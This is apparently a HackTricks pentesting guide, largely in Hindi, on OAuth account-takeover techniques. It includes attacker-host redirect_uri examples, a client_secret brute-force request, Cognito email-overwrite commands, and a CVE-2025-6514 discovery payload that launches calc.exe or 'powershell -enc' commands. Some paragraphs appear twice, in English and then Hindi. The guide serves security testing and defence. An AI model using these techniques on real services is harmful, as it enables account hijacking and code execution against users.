# OAuth to Account takeover

{{#include ../banners/hacktricks-training.md}}

## बुनियादी जानकारी <a href="#d4a8" id="d4a8"></a>

OAuth विभिन्न संस्करणों में उपलब्ध है; इसकी बुनियादी जानकारी [OAuth 2.0 documentation](https://oauth.net/2/) पर मिलती है। यह चर्चा मुख्यतः व्यापक रूप से उपयोग किए जाने वाले [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/) पर केंद्रित है, जो एक ऐसा **authorization framework प्रदान करता है जो किसी application को किसी अन्य application (authorization server) में एक user के खाते पर access या actions करने में सक्षम बनाता है**।

मान लें एक काल्पनिक वेबसाइट _**https://example.com**_ है, जो आपके सभी social media पोस्ट (private ones सहित) दिखाने के लिए बनाई गई है। इसके लिए OAuth 2.0 का उपयोग किया जाता है। _https://example.com_ आपकी social media posts को access करने की अनुमति मांगेगा। परिणामस्वरूप, _https://socialmedia.com_ पर एक consent screen दिखाई देगी, जिसमें **माँगी जा रही permissions और उस developer का नाम जो request कर रहा है** दिखेगा। आपकी अनुमति मिलने पर, _https://example.com_ आपके behalf पर **आपके पोस्ट्स को access करने** में सक्षम हो जाएगा।

OAuth 2.0 फ्रेमवर्क के निम्नलिखित घटकों को समझना आवश्यक है:

- **resource owner**: आप, एक **user/entity** के रूप में, अपने resource (जैसे आपके social media अकाउंट के पोस्ट) की पहुँच की अनुमति प्रदान करते हैं।
- **resource server**: वह **server जो authenticated requests को manage करता है** जब application ने resource owner की ओर से `access token` प्राप्त कर लिया होता है, उदाहरण के लिए **https://socialmedia.com**।
- **client application**: वह **application जो resource owner से authorization मांग रही है**, जैसे **https://example.com**।
- **authorization server**: वह **server जो client application को `access tokens` जारी करता है** जब resource owner सफलतापूर्वक authenticate और authorize कर देता है, उदाहरण के लिए **https://socialmedia.com**।
- **client_id**: application के लिए एक public, unique पहचानकर्ता।
- **client_secret:** एक confidential key, जो केवल application और authorization server जानते हैं, और जो `access_tokens` बनाने में उपयोग होती है।
- **response_type**: एक मान जो बताता है **किस प्रकार का token मांगा जा रहा है**, जैसे `code`।
- **scope**: वह **access level** जो client application resource owner से मांग रही है।
- **redirect_uri**: वह **URL जिस पर user authorization के बाद redirect होता है**। यह सामान्यतः pre-registered redirect URL से मेल खाना चाहिए।
- **state**: एक parameter जो **user के authorization server के पास और वापस redirect होने के दौरान डेटा बनाए रखता है**। इसकी uniqueness महत्वपूर्ण होती है ताकि यह **CSRF protection mechanism** के रूप में काम करे।
- **grant_type**: एक parameter जो बताता है **grant type और किस प्रकार का token लौटाया जाएगा**।
- **code**: authorization server द्वारा दिया गया authorization code, जिसे client application `client_id` और `client_secret` के साथ मिलाकर `access_token` प्राप्त करने के लिए उपयोग करता है।
- **access_token**: वह **token जिसे client application API requests के लिए उपयोग करता है** resource owner की ओर से।
- **refresh_token**: application को एक नया `access_token` प्राप्त करने में सक्षम बनाता है बिना user से फिर से पूछे।

### फ़्लो

वास्तविक OAuth फ़्लो इस प्रकार आगे बढ़ता है:

1. आप [https://example.com](https://example.com) पर जाते हैं और “Integrate with Social Media” बटन चुनते हैं।
2. साइट फिर [https://socialmedia.com](https://socialmedia.com) को आपकी अनुमति के लिए एक request भेजती है ताकि https://example.com की application आपके पोस्ट्स को access कर सके। request इस प्रकार संरचित होती है:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. आपको फिर एक सहमति पृष्ठ दिखाया जाता है।
4. आपकी स्वीकृति के बाद, Social Media `redirect_uri` पर `code` और `state` पैरामीटर के साथ एक प्रतिक्रिया भेजता है:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com अपने `code` को अपने `client_id` और `client_secret` के साथ उपयोग करता है ताकि आपके लिए `access_token` प्राप्त करने हेतु एक server-side request किया जा सके, जिससे आपने जिन permissions के लिए सहमति दी थी उन तक पहुंच मिल जाती है:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. अंत में, प्रक्रिया समाप्त होती है क्योंकि https://example.com आपके `access_token` का उपयोग Social Media पर API कॉल करने के लिए करता है ताकि access प्राप्त किया जा सके

## Vulnerabilities <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

अनुसार [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), authorization server को ब्राउज़र को केवल **पूर्व-रजिस्टर्ड, सटीक redirect URIs** पर ही redirect करना चाहिए। कोई भी कमजोरी यहाँ attacker को victim को malicious authorization URL के माध्यम से भेजने की अनुमति देती है ताकि IdP victim का `code` (और `state`) सीधा attacker endpoint पर दे दे, जिसे attacker फिर redeem कर सकता है और tokens harvest कर सकता है।

आम हमला कार्यप्रवाह:

1. `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` बनाकर उसे victim को भेजें।
2. पीड़ित प्रमाणीकृत होता है और scopes को अनुमोदित करता है।
3. IdP `attacker.tld/callback?code=<victim-code>&state=...` पर redirect कर देता है जहाँ attacker request को लॉग करता है और तुरंत code का एक्सचेंज कर लेता है।

जांचने के लिए सामान्य validation बग:

- **No validation** – any absolute URL is accepted, resulting in instant code theft.
- **Weak substring/regex checks on the host** – bypass with lookalikes such as `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, or `match.com@evil.com`.
- **IDN homograph mismatches** – validation happens on the punycode form (`xn--`), but the browser redirects to the Unicode domain controlled by the attacker.
- **Arbitrary paths on an allowed host** – pointing `redirect_uri` to `/openredirect?next=https://attacker.tld` or any XSS/user-content endpoint leaks the code either through chained redirects, Referer headers, or injected JavaScript.
- **Directory constraints without normalization** – patterns like `/oauth/*` can be bypassed with `/oauth/../anything`.
- **Wildcard subdomains** – accepting `*.example.com` means any takeover (dangling DNS, S3 bucket, etc.) immediately yields a valid callback.
- **Non-HTTPS callbacks** – letting `http://` URIs through gives network attackers (Wi-Fi, corporate proxy) the opportunity to snatch the code in transit.

साथ ही सहायक redirect-style parameters (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, आदि) और OpenID discovery document (`/.well-known/openid-configuration`) की समीक्षा करें ताकि अतिरिक्त endpoints मिल सकें जो समान validation बग inherit कर सकते हैं।

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

जैसा कि इस bug bounty रिपोर्ट [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) में उल्लेख है, यह संभव हो सकता है कि redirect **URL response में reflect हो रहा हो** सर्वर द्वारा user authenticate करने के बाद, जिससे यह **vulnerable to XSS** हो। परीक्षण के लिए संभावित payload:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - state पैरामीटर का अनुचित प्रबंधन <a href="#bda5" id="bda5"></a>

The `state` parameter is the Authorization Code flow CSRF token: the client must generate a **cryptographically random value per browser instance**, persist it somewhere only that browser can read (cookie, local storage, etc.), send it in the authorization request, and reject any response that does not return the same value. Whenever the value is static, predictable, optional, or not tied to the user’s session, the attacker can finish their own OAuth flow, capture the final `?code=` request (without sending it), and later coerce a victim browser into replaying that request so the victim account becomes linked to the attacker’s identity provider profile.

रीप्ले पैटर्न हमेशा एक जैसा रहता है:

1. Attacker अपने account से IdP के खिलाफ authenticate करता है और आखिरी redirect को intercept करता है जिसमें `code` (और कोई `state`) होता है।
2. वे उस request को drop कर देते हैं, URL रख लेते हैं, और बाद में किसी भी CSRF primitive (link, iframe, auto-submitting form) का दुरुपयोग करके victim ब्राउज़र को उसे load करने के लिए मजबूर करते हैं।
3. यदि client `state` को enforce नहीं करता, तो application attacker के authorization result को consume कर लेता है और attacker को victim के app account में लॉग इन कर देता है।

testing के दौरान `state` हैंडलिंग के लिए एक व्यावहारिक चेकलिस्ट:

- **Missing `state` entirely** – यदि यह parameter कभी भी दिखाई नहीं देता, तो पूरा login CSRFable हो जाता है।
- **`state` not required** – इसे initial request से हटा दें; यदि IdP फिर भी codes जारी करता है जिन्हें client स्वीकार करता है, तो यह defense opt-in है।
- **Returned `state` not validated** – response में value के साथ छेड़छाड़ करें (Burp, MITM proxy)। mismatch किए गए values को accept करना मतलब stored token कभी compare ही नहीं होता।
- **Predictable or purely data-driven `state`** – कई apps redirect paths या JSON blobs को `state` में डाल देते हैं बिना randomness मिलाए, जिससे attackers valid values अनुमान लगा कर flows को replay कर सकते हैं। हमेशा data encode करने से पहले मजबूत entropy prepend/append करें।
- **`state` fixation** – यदि app users को `state` value supply करने देता है (उदा., crafted authorization URLs के जरिए) और flow के दौरान उसे reuse करता है, तो attacker एक ज्ञात value lock कर सकता है और उसे multiple victims पर reuse कर सकता है।

PKCE can complement `state` (especially for public clients) by binding the authorization code to a code verifier, but web clients must still track `state` to prevent cross-user CSRF/account-linking bugs.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Attackers पहले से ही victim की email का उपयोग करके account बना सकते हैं। यदि बाद में victim किसी third-party service से login करता है, तो application गलती से उस third-party account को attacker के pre-created account से link कर सकता है, जिससे unauthorized access हो सकता है।
2. **Exploiting Lax OAuth Email Verification**: Attackers उन OAuth services का दुरुपयोग कर सकते हैं जो emails verify नहीं करते — वे अपनी service पर register करके account email को बाद में victim के email में बदल सकते हैं। यह तरीका भी unauthorized account access का जोखिम पैदा करता है, पहले परिदृश्य जैसा ही पर अलग attack vector के जरिए।

### Disclosure of Secrets <a href="#e177" id="e177"></a>

The `client_id` is intentionally public, but the **`client_secret` must never be recoverable by end users**. Authorization Code deployments that embed the secret in **mobile APKs, desktop clients, or single-page apps** effectively hand that credential to anyone who can download the package. Always inspect public clients by:

- APK/IPA, desktop installer, या Electron app को unpack करें और `client_secret`, Base64 blobs जो JSON में decode होते हैं, या hard-coded OAuth endpoints के लिए grep करें।
- bundled config files (plist, JSON, XML) या decompiled strings में client credentials की समीक्षा करें।

एक बार attacker secret extract कर लेता है, उन्हें बस किसी भी victim authorization `code` (कमजोर `redirect_uri`, logs, आदि के जरिए) को चुराना होता है ताकि वे स्वतंत्र रूप से `/token` को हिट करके access/refresh tokens बना सकें बिना legitimate app को शामिल किए। public/native clients को **incapable of holding secrets** मानें — उन्हें static secret की बजाय per-instance code verifier की possession साबित करने के लिए PKCE (RFC 7636) पर निर्भर होना चाहिए। टेस्टिंग के दौरान यह सत्यापित करें कि क्या PKCE mandatory है और क्या backend वास्तव में token exchanges को reject करता है जो या तो `client_secret` **या** एक वैध `code_verifier` को छोड़ देते हैं।

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Once the client has the **code and state**, if it's **reflected inside the Referer header** when he browses to a different page, then it's vulnerable.

### Access Token Stored in Browser History

The core guarantee of the Authorization Code grant is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise. Always check for:

- **Tokens in URLs** – अगर `access_token` query/fragment में दिखाई देता है, तो यह browser history, server logs, analytics, और तीसरे पक्षों को भेजे गए Referer headers में चला जाता है।
- **Tokens transiting untrusted middleboxes** – tokens को HTTP पर वापस भेजना या debugging/corporate proxies के माध्यम से भेजना नेटवर्क पर्यवेक्षकों को उन्हें सीधे capture करने देता है।
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs origin पर हर script (including XSS payloads or malicious extensions) को tokens एक्सपोज़ कर देते हैं।
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` shared devices पर logout के बहुत बाद तक tokens रखती हैं और स्क्रिप्ट द्वारा एक्सेस किए जा सकते हैं।

इनमें से कोई भी finding सामान्यतः “low” bugs (जैसे CSP bypass या DOM XSS) को full API takeover में बदल सकती है क्योंकि attacker बस leaked bearer token को पढ़कर replay कर सकता है।

### Everlasting Authorization Code

Authorization codes must be **short-lived, single-use, and replay-aware**. When assessing a flow, capture a `code` and:

- **Test the lifetime** – RFC 6749 recommends minutes, not hours. 5–10 मिनट के बाद `code` redeem करने की कोशिश करें; अगर यह अभी भी काम करता है, तो किसी भी leaked code के लिए exposure window अत्यधिक है।
- **Test sequential reuse** – वही `code` दो बार भेजें। अगर दूसरी request दूसरी token दे देती है, तो attackers अनंतकाल तक sessions clone कर सकते हैं।
- **Test concurrent redemption/race conditions** – दो token requests समानांतर में भेजें (Burp intruder, turbo intruder)। कमजोर issuers कभी-कभी दोनों को जारी कर देते हैं।
- **Observe replay handling** – किसी reuse प्रयास को केवल fail नहीं होना चाहिए बल्कि उस `code` से पहले से जारी किए गए किसी भी token को revoke भी करना चाहिए। अन्यथा, एक detected replay attacker के पहले token को सक्रिय छोड़ देता है।

replay-friendly code को किसी भी `redirect_uri` या logging bug के साथ जोड़ने से victim के legitimate login पूरा करने के बाद भी persistent account access मिल सकता है।

### Authorization/Refresh Token not bound to client

If you can get the **authorization code and use it with a different client then you can takeover other accounts**.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### अन्य Apps के tokens का दुरुपयोग <a href="#bda5" id="bda5"></a>

As [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth flows that expect to receive the **token** (and not a code) could be vulnerable if they not check that the token belongs to the app.

यह इसलिए है क्योंकि एक **attacker** अपनी ही application में एक **application supporting OAuth and login with Facebook** (उदाहरण के लिए) बना सकता है। फिर, जब एक victim उसी **attackers application** में Facebook से login करता है, तो attacker उस उपयोगकर्ता का वह **OAuth token** जो उसकी application को दिया गया है, प्राप्त कर सकता है और इसे victim OAuth application में victim के user token का उपयोग करके login करने के लिए उपयोग कर सकता है।

> [!CAUTION]
> इसलिए, यदि attacker किसी user को अपनी OAuth application तक पहुँचने के लिए मजबूर करने में सफल हो जाता है, तो वह उन applications में victim का खाता takeover कर सकेगा जो token की उम्मीद कर रहे हैं और यह जाँच नहीं कर रहे कि token उनके app ID को ही प्रदान किया गया था या नहीं।

### Two links & cookie <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), it was possible to make a victim open a page with a **returnUrl** pointing to the attackers host. This info would be **stored in a cookie (RU)** and in a **later step** the **prompt** will **ask** the **user** if he wants to give access to that attackers host.

इस prompt को बायपास करने के लिए, एक टैब खोलकर वो **Oauth flow** शुरू करना संभव था जो **returnUrl** का उपयोग करके यह RU cookie सेट कर देता, prompt दिखने से पहले उस टैब को बंद कर देना, और फिर एक नया टैब बिना उस value के खोल देना। तब, **prompt attackers host के बारे में सूचित नहीं करेगा**, पर cookie उसी पर सेट हो चुकी होगी, इसलिए redirection में **token attackers host को भेज दिया जाएगा**।

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), some OAuth implementations allows to indicate the **`prompt`** GET parameter as None (**`&prompt=none`**) to **prevent users being asked to confirm** the given access in a prompt in the web if they are already logged in the platform.

जैसा कि [**this video**] में समझाया गया है, कुछ OAuth implementations GET parameter **`prompt`** को None (**`&prompt=none`**) के रूप में सेट करने की अनुमति देते हैं ताकि यदि उपयोगकर्ता पहले से ही प्लेटफ़ॉर्म पर logged in हों तो उन्हें वेब पर दिए गए access की पुष्टि के लिए prompt में न पूछा जाए।

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), it might be possible to indicate the parameter **`response_mode`** to indicate where do you want the code to be provided in the final URL:

- `response_mode=query` -> The code is provided inside a GET parameter: `?code=2397rf3gu93f`
- `response_mode=fragment` -> The code is provided inside the URL fragment parameter `#code=2397rf3gu93f`
- `response_mode=form_post` -> The code is provided inside a POST form with an input called `code` and the value
- `response_mode=web_message` -> The code is send in a post message: `window.opener.postMessage({"code": "asdasdasd...`

जैसा कि [**explained in this video**] में बताया गया है, यह संभव हो सकता है कि आप parameter **`response_mode`** निर्दिष्ट करें ताकि अंतिम URL में code कहाँ प्रदान किया जाएगा यह निर्धारित हो सके:

- `response_mode=query` -> code GET parameter में प्रदान किया जाता है: `?code=2397rf3gu93f`
- `response_mode=fragment` -> code URL के fragment में प्रदान किया जाता है: `#code=2397rf3gu93f`
- `response_mode=form_post` -> code एक POST form के अंदर, `code` नामक input के रूप में प्रदान किया जाता है और value
- `response_mode=web_message` -> code एक post message में भेजा जाता है: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login dialogs clickjacking के लिए आदर्श लक्ष्य होते हैं: अगर इन्हें framed किया जा सके, तो एक attacker कस्टम graphics ओवरले कर सकता है, असली बटनों को छिपा सकता है, और उपयोगकर्ताओं को खतरनाक scopes approve करने या accounts लिंक करने के लिए trick कर सकता है। PoCs बनाते समय:

1. IdP authorization URL को `<iframe sandbox="allow-forms allow-scripts allow-same-origin">` के अंदर load करें।
2. fake बटनों को hidden **Allow**/**Approve** controls के साथ align करने के लिए absolute positioning/opacity tricks का उपयोग करें।
3. वैकल्पिक रूप से parameters (scopes, redirect URI) को pre-fill करें ताकि चोरी किया गया approval तुरंत attacker को लाभ दे।

Testing के दौरान सुनिश्चित करें कि IdP पेज या तो `X-Frame-Options: DENY/SAMEORIGIN` emit करते हैं या एक restrictive `Content-Security-Policy: frame-ancestors 'none'` सेट करते हैं। अगर दोनों में से कोई मौजूद नहीं है, तो [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) जैसे टूल का उपयोग करके जोखिम की demonstration करें और रिकॉर्ड करें कि कितनी आसानी से एक victim attacker की app को authorize करता है। अतिरिक्त payload विचारों के लिए देखें [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), this is an OAuth flow that allows to login in OAuth via **username** and **password**. If during this simple flow a **token** with access to all the actions the user can perform is returned then it's possible to bypass 2FA using that token.

के अनुसार [**this blog post**], यह एक OAuth flow है जो **username** और **password** के माध्यम से OAuth में login करने की अनुमति देता है। यदि इस सरल flow के दौरान ऐसा एक **token** लौटता है जिसके पास उपयोगकर्ता द्वारा की जाने वाली सभी actions का access है, तो उस token का उपयोग करके 2FA bypass किया जा सकता है।

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) comments how it was possible to abuse an **open redirect** to the value from the **referrer** to abuse OAuth to ATO. The attack was:

1. Victim access the attackers web page
2. The victim opens the malicious link and an opener starts the Google OAuth flow with `response_type=id_token,code&prompt=none` as additional parameters using as **referrer the attackers website**.
3. In the opener, after the provider authorizes the victim, it sends them back to the value of the `redirect_uri` parameter (victim web) with 30X code which still keeps the attackers website in the referer.
4. The victim **website trigger the open redirect based on the referrer** redirecting the victim user to the attackers website, as the **`respose_type`** was **`id_token,code`**, the code will be sent back to the attacker in the **fragment** of the URL allowing him to tacke over the account of the user via Google in the victims site.

This [**blogpost**] में बताया गया है कि कैसे **open redirect** का उपयोग करके **referrer** के value को abuse करके OAuth से ATO तक पहुँच बनाई जा सकती थी। हमला इस प्रकार था:

1. Victim attacker की web page को access करता है
2. Victim malicious link खोलता है और एक opener Google OAuth flow शुरू करता है जिसमें `response_type=id_token,code&prompt=none` अतिरिक्त parameters के रूप में होते हैं और **referrer** के रूप में attackers वेबसाइट इस्तेमाल होती है।
3. opener में, provider के द्वारा victim को authorize करने के बाद, वह उन्हें `redirect_uri` parameter के value (victim web) पर 30X code के साथ वापस भेजता है, जो अभी भी referer में attackers वेबसाइट बनाए रखता है।
4. Victim की **website referrer के आधार पर open redirect trigger** कर देती है और victim user को attackers वेबसाइट पर redirect कर देती है; चूंकि **`respose_type`** **`id_token,code`** था, इसलिए code URL के **fragment** में attacker को भेज दिया जाएगा जिससे वह victim के Google के जरिए site पर खाते को takeover कर सकेगा।

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration in OAuth serves as a less obvious but critical vector for security vulnerabilities, specifically for **Server-Side Request Forgery (SSRF)** attacks. This endpoint allows OAuth servers to receive details about client applications, including sensitive URLs that could be exploited.

मुख्य बिंदु:

- **Dynamic Client Registration** अक्सर `/register` से मैप होता है और POST requests के जरिए `client_name`, `client_secret`, `redirect_uris`, और logos या JSON Web Key Sets (JWKs) के लिए URLs स्वीकार करता है।
- यह फीचर **RFC7591** और **OpenID Connect Registration 1.0** में दिए गए specifications का पालन करता है, जिनमें ऐसे parameters होते हैं जो SSRF के लिए संवेदनशील हो सकते हैं।
- रजिस्ट्रेशन प्रक्रिया कई तरीकों से सर्वरों को SSRF के प्रति उजागर कर सकती है:
  - **`logo_uri`**: client application के logo के लिए एक URL जो server द्वारा fetch किया जा सकता है, जिससे SSRF या URL के गलत हैंडलिंग पर XSS हो सकता है।
  - **`jwks_uri`**: client के JWK document का URL, जो अगर malicious हो तो server को attacker-controlled सर्वर पर outbound requests करने पर मजबूर कर सकता है।
  - **`sector_identifier_uri`**: `redirect_uris` के JSON array को reference करता है, जिसे server fetch कर सकता है और SSRF का अवसर बनता है।
  - **`request_uris`**: client के लिए allowed request URIs की सूची, जिसे authorization प्रक्रिया की शुरुआत में server द्वारा fetch करने पर exploit किया जा सकता है।

Exploitation Strategy:

- SSRF को trigger किया जा सकता है एक नए client को malicious URLs के साथ register करके जैसे `logo_uri`, `jwks_uri`, या `sector_identifier_uri` में।
- जबकि `request_uris` के माध्यम से direct exploitation को whitelist controls से mitigate किया जा सकता है, एक pre-registered, attacker-controlled `request_uri` प्रदान करना authorization चरण के दौरान SSRF को आसान बना सकता है।

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Research on [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impacting `mcp-remote` clients such as Claude Desktop, Cursor or Windsurf) shows how **dynamic OAuth discovery becomes an RCE primitive** whenever the client forwards IdP metadata straight to the operating system. The remote MCP server returns an attacker-controlled `authorization_endpoint` during the discovery exchange (`/.well-known/openid-configuration` or any metadata RPC). `mcp-remote ≤0.1.15` would then call the system URL handler (`start`, `open`, `xdg-open`, etc.) with whatever string arrived, so any scheme/path supported by the OS executed locally.

प्रभावित ग्राहकों (जैसे Claude Desktop, Cursor या Windsurf) वाले `mcp-remote` क्लाइंट्स पर शोध दिखाता है कि जब client IdP metadata को सीधे operating system को फॉरवर्ड करता है तो dynamic OAuth discovery एक RCE primitive बन जाती है। remote MCP server discovery exchange (`/.well-known/openid-configuration` या कोई भी metadata RPC) के दौरान attacker-controlled `authorization_endpoint` लौटाता है। `mcp-remote ≤0.1.15` तब system URL handler (`start`, `open`, `xdg-open`, आदि) को उस string के साथ कॉल कर देता था जो आया था, इसलिए OS द्वारा समर्थन किए जाने वाले किसी भी scheme/path को लोकली execute किया जा सकता था।

Attack workflow

1. Point the desktop agent to a hostile MCP/OAuth server (`npx mcp-remote https://evil`). The agent receives `401` plus metadata.
2. The server answers with JSON such as:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. क्लाइंट सप्लाई किए गए URI के लिए OS हैंडलर लॉन्च करता है। Windows ऐसे payloads स्वीकार करता है जैसे `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux `file:///Applications/Calculator.app/...` स्वीकार करते हैं या यहां तक कि कस्टम schemes जैसे कि `cmd://bash -lc '<payload>'` यदि रजिस्टर किए गए हों।
4. चूंकि यह किसी भी user interaction से पहले होता है, **सिर्फ क्लाइंट को attacker server से बात करने के लिए कॉन्फ़िगर करना ही code execution दे देता है**।

**How to test**

- Target any OAuth-capable desktop/agent that performs discovery over HTTP(S) and opens returned endpoints locally (Electron apps, CLI helpers, thick clients).
- Intercept या host करें discovery response और `authorization_endpoint`, `device_authorization_endpoint`, या इसी तरह के फ़ील्ड को `file://`, `cmd://`, UNC paths, या अन्य खतरनाक schemes से बदल दें।
- Observe करें कि क्लाइंट scheme/host को validate करता है या नहीं। validation का अभाव user context के अंतर्गत तुरंत execution का कारण बनता है और समस्या को सिद्ध करता है।
- अलग-अलग schemes के साथ दोहराएँ ताकि पूर्ण attack surface मैप हो सके (उदा., `ms-excel:`, `data:text/html,`, custom protocol handlers) और cross-platform पहुँच दिखाएँ।

## OAuth providers Race Conditions

यदि आप जिस प्लेटफ़ॉर्म का परीक्षण कर रहे हैं वह एक OAuth provider है [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, `sub` field किसी user की unique पहचान करता है, लेकिन इसका फ़ॉर्मेट Authorization Server के अनुसार बदलता है। user पहचान को standardize करने के लिए कुछ clients emails या user handles का उपयोग करते हैं। हालांकि, यह जोखिम भरा है क्योंकि:

- कुछ Authorization Servers यह सुनिश्चित नहीं करते कि ये properties (जैसे email) immutable बनी रहें।
- कुछ implementations में—जैसे **"Login with Microsoft"**—क्लाइंट email field पर निर्भर करता है, जो **Entra ID में user द्वारा user-controlled** होता है और verified नहीं होता।
- एक attacker इसे exploit कर सकता है अपने खुद के Azure AD organization (उदा., doyensectestorg) बनाकर और उसे Microsoft login perform करने के लिए उपयोग करके।
- भले ही Object ID (जो `sub` में स्टोर होता है) immutable और secure हो, mutable email field पर निर्भरता account takeover को सक्षम कर सकती है (उदा., victim@gmail.com जैसे account का hijack)।

## Client Confusion Attack

In a **Client Confusion Attack**, एक application जो OAuth Implicit Flow का उपयोग करती है, यह verify करने में विफल रहती है कि final access token विशेष रूप से उसके अपने Client ID के लिए जनरेट हुआ है या नहीं। एक attacker एक public website सेटअप करता है जो Google’s OAuth Implicit Flow का उपयोग करती है, हजारों users को login करने के लिए trick करके attacker की साइट के लिए intended access tokens harvest कर लेती है। यदि इन users के accounts किसी अन्य vulnerable वेबसाइट पर भी हैं जो token के Client ID को validate नहीं करती, तो attacker harvested tokens को reuse करके victims की impersonation कर सकता है और उनके accounts का takeover कर सकता है।

## Scope Upgrade Attack

Authorization Code Grant का प्रकार user डेटा ट्रांसमिट करने के लिए secure server-to-server communication शामिल करता है। हालांकि, यदि Authorization Server Access Token Request में एक scope parameter पर implicitly trust करता है (एक parameter जो RFC में परिभाषित नहीं है), तो एक malicious application authorization code के privileges को higher scope अनुरोध करके upgrade कर सकती है। जब Access Token जनरेट हो जाता है, तो Resource Server को इसे verify करना चाहिए: JWT tokens के लिए, इसमें JWT signature की जाँच और client_id तथा scope जैसे डेटा को निकालना शामिल है, जबकि random string tokens के लिए, server को token के विवरण प्राप्त करने के लिए Authorization Server से query करना चाहिए।

## Redirect Scheme Hijacking

Mobile OAuth implementations में apps redirects को Authorization Codes के साथ receive करने के लिए custom URI schemes का उपयोग करते हैं। हालांकि, क्योंकि एक device पर एक ही scheme कई apps द्वारा रजिस्टर की जा सकती है, यह धारणा कि केवल legitimate client redirect URI नियंत्रित करता है, भंग हो जाती है। उदाहरण के लिए Android पर, एक Intent URI जैसे `com.example.app://` oauth उस scheme और app के intent-filter में परिभाषित optional filters के आधार पर पकड़ी जाती है। चूंकि Android की intent resolution व्यापक हो सकती है—खासकर जब सिर्फ scheme specify किया गया हो—एक attacker एक malicious app register कर सकता है जिसमें सावधानीपूर्वक crafted intent filter हो ताकि authorization code को hijack किया जा सके। यह या तो user interaction के माध्यम से (जब कई apps intent handle करने के लिए eligible हों) या उन bypass techniques के जरिए जो overly specific filters का exploit करती हैं, **account takeover को सक्षम कर सकता है**, जैसा कि Ostorlab के assessment flowchart में विस्तार से बताया गया है।

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
